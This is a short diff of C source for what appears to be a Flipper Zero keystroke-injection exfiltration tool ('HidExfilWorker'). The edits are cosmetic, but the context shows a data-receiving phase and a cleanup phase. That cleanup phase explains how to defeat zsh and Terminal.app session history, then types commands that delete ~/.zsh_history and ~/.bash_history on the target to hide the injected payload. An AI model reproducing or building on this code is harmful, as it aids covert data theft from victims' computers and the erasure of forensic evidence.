@@ -401,9 +401,7 @@ static bool phase_receive(HidExfilWorker* worker) {
                     (unsigned long)worker->state.bytes_received);
                 if(worker->callback) {
                     worker->callback(
-                        PhaseReceiving,
-                        worker->state.bytes_received,
-                        worker->callback_context);
+                        PhaseReceiving, worker->state.bytes_received, worker->callback_context);
                 }
                 return true;
             } else {
@@ -467,7 +465,7 @@ static void phase_cleanup(HidExfilWorker* worker) {
          * the in-memory history (including payload commands) to a new
          * ~/.zsh_history on exit, defeating the cleanup.
          * Terminal.app also saves per-session history via a precmd hook
-         * in /etc/zshrc_Apple_Terminal to ~/.zsh_sessions/*.history.
+         * in /etc/zshrc_Apple_Terminal to ~/.zsh_sessions/ *.history.
          * Removing $SHELL_SESSION_FILE and unsetting it prevents that. */
         furi_delay_ms(300);
         type_string("rm -f ~/.zsh_history ~/.bash_history\r\n", delay, worker);
